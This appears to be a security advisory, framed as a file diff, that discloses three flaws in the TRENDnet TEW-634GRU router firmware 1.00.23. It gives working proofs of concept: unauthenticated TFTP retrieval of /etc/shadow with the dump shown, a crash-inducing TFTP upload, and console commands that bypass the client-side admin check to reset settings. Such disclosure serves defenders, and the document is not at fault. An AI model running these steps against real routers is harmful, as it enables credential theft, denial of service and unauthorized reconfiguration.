@@ -1,0 +1,90 @@
+# Title: TRENDnet TEW-634GRU 1.00.23 Multiple Vulnerabilities
+# Author: SirGod
+# Website: www.rstforums.com
+# Vendor Homepage: http://www.trendnet.com/
+# Version: 1.00.23 
+
+
+1. Local file disclosure
+
+The router has the TFTP service enabled by default and it can be accessed without any prior authentication (since TFTP does not support authentication). The whole filesystem is exposed to any person that is connected to the network.
+
+Proof of concept:
+
+sirgod@linuxbox:~$ tftp 192.168.10.1
+tftp> get
+(files) /etc/shadow
+Received 357 bytes in 0.3 seconds
+tftp> quit
+sirgod@linuxbox:~$ cat shadow
+root::10933:0:99999:7:::
+Admin:[REMOVED]:10933:0:99999:7:::
+bin::10933:0:99999:7:::
+daemon::10933:0:99999:7:::
+adm::10933:0:99999:7:::
+lp:*:10933:0:99999:7:::
+sync:*:10933:0:99999:7:::
+shutdown:*:10933:0:99999:7:::
+halt:*:10933:0:99999:7:::
+uucp:*:10933:0:99999:7:::
+operator:*:10933:0:99999:7:::
+nobody::10933:0:99999:7:::
+ap71::10933:0:99999:7:::
+
+
+2. Local router crash 
+
+If you upload a file to the router, it will crash. You will have to reset it (physically) and reconfigure it. After the file is uploaded, accessing the router's IP will give you a blank page and then it will crash.
+
+Proof of concept:
+
+sirgod@linuxbox:~$ tftp 192.168.10.1
+tftp> put
+(file) /home/file.txt /www/file.txt
+
+
+3. Privilege escalation
+
+The web app incorporates two types of login: user and admin. Few actions (load settings, reset settings) require an admin account to perform them. The validation is done client-side, in JavaScript. See the following code snippet:
+
+settings.asp
+
+--- START CODE SNIPPET --- 
+
+	function check_load_settings(){
+		var login_who="user"; 
+		if(login_who== "user"){
+			window.location.href ="back.asp";
+		}else{
+			if(confirm(msg[MSG17])){
+				if (get_by_id("file").value == ''){
+					alert(msg[MSG33]);
+				}else{
+					send_submit("form1");
+				}		
+			}
+		}
+	}
+	
+	function check_restore_default(){		
+		var login_who="user";
+		if(login_who== "user"){
+			window.location.href ="back.asp";
+		}else{
+			if(confirm(msg[MSG34])){
+		    	send_submit("form2");
+		   	}
+		}
+	}
+
+--- END CODE SNIPPET --- 
+
+There are two ways to bypass this:
+
+a) The easy way: submit the form from the JavaScript console, directly from your browser, by running:
+
+send_submit("form2"); // To restore factory default settings
+send_submit("form3"); // To restore configuration settings (existent). You must select a file beforehand.
+
+
+b) The other way: You can save the page locally, change the value of the variable and run it.
